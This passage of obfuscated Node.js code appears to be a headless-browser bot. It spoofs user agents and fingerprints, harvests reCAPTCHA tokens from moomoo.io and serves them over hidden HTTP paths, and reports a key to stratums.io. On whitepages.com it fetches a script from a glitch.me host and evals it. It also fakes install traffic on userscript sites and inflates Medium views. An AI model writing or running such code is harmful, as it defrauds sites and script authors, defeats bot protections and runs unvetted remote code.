      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + U(0xa) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + T(0x11) + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + V(0x12, 'S(i2') + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + T(0x1c) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + V(0x19, '5hBJ') + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + T(0x1),
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + T(0x10),
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x355 * -0xa + 0x49 * 0x6e + -0x40b0
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2 * -0xad5 + -0x1fd8 + 0xa2e * 0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x5d9 * 0x1 + 0x1f9b + -0x195e), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x14a8 + -0x175 * 0x5 + -0xcfb), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x49f + -0x23bd * -0x1 + 0xf8f * -0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x210a + 0xb87 + -0x1 * 0x2c91; w < getRandomInt(-0x1b9a + -0x9c8 * 0x2 + 0x2f2b, -0x3b3 * -0x1 + 0x1 * -0x16f3 + 0x1 * 0x1345); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xa913 * 0x2 + 0xc02c + 0xb7 * -0x19e);
        }
      }();
    }, -0x1 * -0xd79 + 0x1 * -0x1af3 + 0x47 * 0x32), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const W = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x17a7 + -0xce5 + -0x923 * -0x4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + W(0x2, 'HoP0')))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xe5b + 0x19f + -0x5 * 0x332, -0x13 * 0xb3 + 0xde2 + 0x1 * -0x67)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x62dd * 0x1 + -0x9285 + 0xa4d8);
    }, 0x74e + -0x6 * 0x25a + 0x732), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const X = c;
        try {
          let s = -0x20ad + 0x3 * 0xb07 + -0x68;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on'](X(0xb), function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x3 * -0x1cd + 0x24d * 0xd + -0x1798), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x8 * 0x184 + 0x1 * -0x1ad7 + 0x26f7), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x136f89 + -0xc5b * -0x204 + -0x1e9b55);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x7 * -0x40d + -0x1bb + -0xa6 * -0x2f);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x2b * 0xad + -0x4e * -0x4a + 0x74b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x5 * -0xa8b + 0x7df * -0x3 + 0x5 * 0x1594);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = d,
    Z = b;
  async function f() {
    const Y = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * 0xaf6 + 0x237e + -0x17 * 0x205) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xb * -0x1d + -0x187c + 0xc * 0x225));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x4cf + -0x16d5 + 0x1ba4, D['indexOf']('\x20'));
        return B ? E['slice'](0x203e + 0x1fb * -0x1 + -0x1e43, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x11 * -0x1f1 + -0x6 * -0x164 + 0x5 * -0x75),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': Y(0x17),
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2615 * -0x1 + -0x3ced * -0x1 + -0x3bf2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object[Y(0x18)](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + Z(0x4, 'hFY1') + '_Global_Na' + 'me_Manager' + a0(0x0) + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      a1(0x5) + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + Z(0x6, 'vLv#') + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + Z(0xf, 'TVu5') + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      a0(0x9) + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
